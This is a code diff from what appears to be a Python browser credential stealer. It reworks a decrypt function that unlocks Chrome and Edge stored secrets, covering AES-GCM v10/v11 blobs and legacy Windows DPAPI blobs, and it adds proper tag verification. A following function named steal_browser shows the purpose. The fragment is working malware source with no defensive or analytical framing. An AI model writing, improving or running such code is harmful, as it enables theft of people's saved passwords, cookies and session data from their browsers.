@@ -165,17 +165,24 @@ def get_key(path):
     except Exception as e:
         return None
 
-def decrypt(buff, key):
+def decrypt(buff, aes_key):
+    """
+    Decrypt a Chrome/Edge blob: handles v10/v11 AES-GCM and legacy DPAPI blobs.
+    """
     try:
-        if buff.startswith(b'v10') or buff.startswith(b'v11'):
-            iv, payload = buff[3:15], buff[15:]
-            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
-            return cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
+        # New style AES‑GCM (v10 or v11 prefix)
+        if buff[:3] in (b'v10', b'v11'):
+            iv = buff[3:15]
+            payload = buff[15:-16]
+            tag = buff[-16:]
+            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+            return cipher.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
         else:
-            # Fallback for older DPAPI encryption
+            # Older style DPAPI (no v10/v11 prefix)
             return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
     except Exception as e:
-        return f"[FAILED: {str(e)}]"
+        return f"[FAILED: {e}]"
+
 
 
 def steal_browser():
